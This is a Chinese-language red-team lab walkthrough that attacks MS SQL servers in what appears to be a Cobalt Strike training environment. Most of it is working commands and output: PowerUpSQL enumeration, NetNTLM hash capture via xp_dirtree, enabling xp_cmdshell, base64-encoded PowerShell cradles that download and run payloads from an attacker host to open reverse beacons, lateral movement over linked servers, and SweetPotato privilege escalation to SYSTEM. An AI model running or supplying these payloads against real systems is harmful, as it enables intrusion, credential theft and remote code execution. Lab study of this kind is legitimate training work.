powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/a'))"
# MS SQL Servers

引入powerupsql，枚举mssql实例

```
beacon> powershell-import C:\Tools\PowerUpSQL\PowerUpSQL.ps1
[*] Tasked beacon to import: C:\Tools\PowerUpSQL\PowerUpSQL.ps1
[+] host called home, sent: 202920 bytes
beacon> getuid
[*] Tasked beacon to get userid
[+] host called home, sent: 20 bytes
[*] You are DEV\bfarmer
beacon> powershell Get-SQLInstanceDomain
[*] Tasked beacon to run: Get-SQLInstanceDomain
[+] host called home, sent: 341 bytes
[+] received output:
#< CLIXML


ComputerName     : srv-1.dev.cyberbotic.io
Instance         : srv-1.dev.cyberbotic.io,1433
DomainAccountSid : 15000005210002361191261941702819312113313089172110400
DomainAccount    : svc_mssql
DomainAccountCn  : MS SQL Service
Service          : MSSQLSvc
Spn              : MSSQLSvc/srv-1.dev.cyberbotic.io:1433
LastLogon        : 5/3/2022 11:12 AM
Description      : 

```

有一个实例：```srv-1.dev.cyberbotic.io,1433```

根据实例查看当前session是否有进入权限

```
beacon> powershell Get-SQLConnectionTest -Instance "srv-1.dev.cyberbotic.io,1433" | fl
[*] Tasked beacon to run: Get-SQLConnectionTest -Instance "srv-1.dev.cyberbotic.io,1433" | fl
[+] host called home, sent: 461 bytes
[+] received output:
#< CLIXML


ComputerName : srv-1.dev.cyberbotic.io
Instance     : srv-1.dev.cyberbotic.io,1433
Status       : Accessible

```

显示Accessible，表明有权限


查看这个实例的更多信息
```
beacon> powershell Get-SQLServerInfo -Instance "srv-1.dev.cyberbotic.io,1433"
[*] Tasked beacon to run: Get-SQLServerInfo -Instance "srv-1.dev.cyberbotic.io,1433"
[+] host called home, sent: 437 bytes
[+] received output:
#< CLIXML


ComputerName           : srv-1.dev.cyberbotic.io
Instance               : SRV-1
DomainName             : DEV
ServiceProcessID       : 2744
ServiceName            : MSSQLSERVER
ServiceAccount         : DEV\svc_mssql
AuthenticationMode     : Windows Authentication
ForcedEncryption       : 0
Clustered              : No
SQLServerVersionNumber : 13.0.5026.0
SQLServerMajorVersion  : 2016
SQLServerEdition       : Standard Edition (64-bit)
SQLServerServicePack   : SP2
OSArchitecture         : X64
OsMachineType          : ServerNT
OSVersionName          : Windows Server 2016 Datacenter
OsVersionNumber        : SQL
Currentlogin           : DEV\bfarmer
IsSysadmin             : Yes
ActiveSessions         : 1

```

注意这两个字段,表明bfarmer对mssql有超级管理员权限
```
Currentlogin           : DEV\bfarmer
IsSysadmin             : Yes
```

## 利用

**方法1**
对这个实例进行sql语句查询

```
beacon> powershell Get-SQLQuery -Instance "srv-1.dev.cyberbotic.io,1433" -Query "select @@servername"
[*] Tasked beacon to run: Get-SQLQuery -Instance "srv-1.dev.cyberbotic.io,1433" -Query "select @@servername"
[+] host called home, sent: 501 bytes
[+] received output:
#< CLIXML

Column1
-------
SRV-1  
```


**方法二**

使用

先在wkstn-1上做一个pivot
```
socks 1080
```

再在kali上用mssqlclient.py登录mssql
```
proxychains python3 /usr/local/bin/mssqlclient.py -windows-auth DEV/bfarmer@10.10.17.25
```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660780102416.png)

**方法3**

这里需要用Proxifier做一个代理才能访问到10.10.17.25


1. 子网主机里开启一个pivot
```
beacon> socks 1080
[+] started SOCKS4a server on: 1080
[+] host called home, sent: 16 bytes
beacon> run hostname
[*] Tasked beacon to run: hostname
[+] host called home, sent: 26 bytes
[+] received output:
wkstn-1

beacon> shell ipconfig
[*] Tasked beacon to run: ipconfig
[+] host called home, sent: 39 bytes
[+] received output:

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 10.10.17.231
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.17.1

Tunnel adapter isatap.{90869922-2FCF-4D43-859E-B22588A4FFEF}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 

```

2. 创建一个proxyserver


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660832489408.png)

3. 创建一个Proxification Rules


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660832683125.png)


4. 注意，这里需要用bfmarer的身份开启heidisql.exe，这样后面的windows auth登录才能成功
```
runas /netonly /user:DEV\bfarmer c:\Tools\Heidisql\heidisql.exe
```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660869054791.png)


5. 成功连接数据库，执行查询


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660869206564.png)


# MS SQL NetNTLM Capture

此操作要求管理员权限

以管理员权限打开一个powershell（bfarmer身份）

去到```//dc-2/home$```文件夹

执行```powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/a'))"```

拿到管理员权限


在新的beacon下
```
 execute-assembly C:\Tools\InveighZero\Inveigh\bin\Debug\Inveigh.exe -DNS N -LLMNR N -LLMNRv6 N -HTTP N -FileOutput N
```

在mssql server执行
```
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```

收到net NTLM哈希


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660955764190.png)


等价方法，可以使用WinDivert + rportfwd的组合，参考relay那章，在kali上接受上面的net NTLM哈希
```
python3 /usr/local/bin/smbserver.py -smb2support pwn .
```


# MS SQL Command Execution

在beacon执行命令
```
beacon> powershell-import C:\Tools\PowerUpSQL\PowerUpSQL.ps1
[*] Tasked beacon to import: C:\Tools\PowerUpSQL\PowerUpSQL.ps1
[+] host called home, sent: 202908 bytes
beacon> powershell Invoke-SQLOSCmd -Instance "srv-1.dev.cyberbotic.io,1433" -Command "whoami" -RawResults
[*] Tasked beacon to run: Invoke-SQLOSCmd -Instance "srv-1.dev.cyberbotic.io,1433" -Command "whoami" -RawResults
[+] host called home, sent: 501 bytes
[+] received output:
#< CLIXML
dev\svc_mssql

```


在Heidi执行命令,首先查看权限

```
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';
```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660956195011.png)

0=没有权限，1=有权限

如果上面的值是0，执行
```
sp_configure 'Show Advanced Options', 1; RECONFIGURE; sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

现在可以执行命令


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660956339358.png)


## 利用mssql执行命令的权限返回一个shell

1. 因为这里mssql的流量不可以直接流向跟攻击机，因此需要做一个转发

在wkstn-1
```
rportfwd 8080 10.10.5.120 80
```

2. 做一个pivot listener


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660956769959.png)

配置


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660956854183.png)

3. 使用上面的listener做一个攻击payload


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660956941305.png)

生成payload
```
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/w1'))"
```

把上面双引号里面的内容单独截取
```
IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/w1'))
```

换IP和端口,由于我们上面做了转发。10.10.5.120:80现在等于10.10.17.231:8080
```
IEX ((new-object net.webclient).downloadstring("http://10.10.17.231:8080/w1"))
```

使用powershell encode上面的字符串

```
PS C:\Users\max> $str = 'IEX ((new-object net.webclient).downloadstring("http://10.10.17.231:8080/w1"))'
PS C:\Users\max> [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADcALgAyADMAMQA6ADgAMAA4ADAALwB3ADEAIgApACkA
```

4. 使用上面的加密串在msqll server执行下面的命令

格式：
```
EXEC xp_cmdshell 'powershell -w hidden -enc <这里是加密命令>
```

```
EXEC xp_cmdshell 'powershell -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADcALgAyADMAMQA6ADgAMAA4ADAALwB3ADEAIgApACkA';
```

收到反弹的beacon


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660957434664.png)

# MS SQL Lateral Movement

查看mssql的实例
```
SELECT * FROM master..sysservers;
```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660957799421.png)

根据实例执行命令
```
SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'select @@servername');
```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660957846477.png)


查看在这个实例上是否有执行命令的能力
```
SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'SELECT * FROM sys.configurations WHERE name = ''xp_cmdshell''');
```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660957909630.png)

值=1，可以执行命令

如果上面的值是0可以执行下面的命令打开

```
EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [target instance]
EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [target instance]
```


上面查询实例的等价操作
```
beacon> powershell Get-SQLServerLinkCrawl -Instance "srv-1.dev.cyberbotic.io,1433"
[*] Tasked beacon to run: Get-SQLServerLinkCrawl -Instance "srv-1.dev.cyberbotic.io,1433"
[+] host called home, sent: 453 bytes
[+] received output:
#< CLIXML


Version     : SQL Server 2016 
Instance    : SRV-1
CustomQuery : 
Sysadmin    : 1
Path        : {SRV-1}
User        : DEV\bfarmer
Links       : {SQL-1.CYBERBOTIC.IO}

Version     : SQL Server 2016 
Instance    : SQL-1
CustomQuery : 
Sysadmin    : 1
Path        : {SRV-1, SQL-1.CYBERBOTIC.IO}
User        : sa
Links       : {SQL01.ZEROPOINTSECURITY.LOCAL}

Version     : SQL Server 2019 
Instance    : SQL01\SQLEXPRESS
CustomQuery : 
Sysadmin    : 1
Path        : {SRV-1, SQL-1.CYBERBOTIC.IO, SQL01.ZEROPOINTSECURITY.LOCAL}
User        : sa
Links       : 



```

我们当前账号在3个实例上都是Sysadmin权限



## 对sql-1.cyberbotic.io这个实例反弹回一个shell,依然使用上面的加密命令
```
SELECT * FROM OPENQUERY( "sql-1.cyberbotic.io" , 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADcALgAyADMAMQA6ADgAMAA4ADAALwB3ADEAIgApACkA''' )
```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660958218908.png)



## 对sql01.zeropointsecurity.local这个实例反弹回一个shell

这里注意zeropointsecurity.local是不能直接跟靶机通信的,必须以sql-1.cyberbotic.io做一个pivot

在sql-1做一个转发
```
rportfwd 8080 10.10.5.120 8080
```

在sql-1做一个lisener


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661064830268.png)

生成一句话payload

```
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/sql1'))"
```


把上面双引号里面的内容单独截取
```
IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/sql1'))
```

换IP和端口,由于我们上面做了转发。10.10.5.120:80现在等于10.10.15.90:8080


```
IEX ((new-object net.webclient).downloadstring("http://10.10.15.90:8080/sql1"))
```

使用powershell encode上面的字符串

```
PS C:\Users\max> $str = 'IEX ((new-object net.webclient).downloadstring("http://10.10.15.90:8080/sql1"))'
PS C:\Users\max> [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADUALgA5ADAAOgA4ADAAOAAwAC8AcwBxAGwAMQAiACkAKQA=
```

执行
```
SELECT * FROM OPENQUERY( "sql-1.cyberbotic.io" , 'select * from openquery("sql01.zeropointsecurity.local", ''select @@servername; exec xp_cmdshell ''''powershell -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADUALgA5ADAAOgA4ADAAOAAwAC8AcwBxAGwAMQAiACkAKQA='''' '')' )
```


拿到sql01.zeropointsecurity.local的beacon


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661065278050.png)


# MS SQL Privilege Escalation

在sql01，返回的shell不是system权限

```
beacon> getuid
[*] Tasked beacon to get userid
[+] host called home, sent: 8 bytes
[*] You are NT Service\MSSQL$SQLEXPRESS
beacon> shell hostname
[*] Tasked beacon to run: hostname
[+] host called home, sent: 39 bytes
[+] received output:
sql01

beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe TokenPrivileges
[*] Tasked beacon to run .NET program: Seatbelt.exe TokenPrivileges
[+] host called home, sent: 775753 bytes
[+] received output:

====== TokenPrivileges ======

Current Token's Privileges

                SeAssignPrimaryTokenPrivilege:  DISABLED
                     SeIncreaseQuotaPrivilege:  DISABLED
                      SeChangeNotifyPrivilege:  SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
                      SeManageVolumePrivilege:  SE_PRIVILEGE_ENABLED
                       SeImpersonatePrivilege:  SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
                      SeCreateGlobalPrivilege:  SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
                SeIncreaseWorkingSetPrivilege:  DISABLED

```

开启了```SeImpersonatePrivilege```能力

可以用烂土豆提权，这个在OSCP做过很多，不多解释

加密payload依然使用上面生成的rev shell，其实这里就是模拟system的token执行一个powershell
```
execute-assembly C:\Tools\SweetPotato\bin\Debug\SweetPotato.exe -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a "-w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADUALgA5ADAAOgA4ADAAOAAwAC8AcwBxAGwAMQAiACkAKQA="
```

执行以后返回一个system的beacon


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661066023303.png)



![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661066137416.png)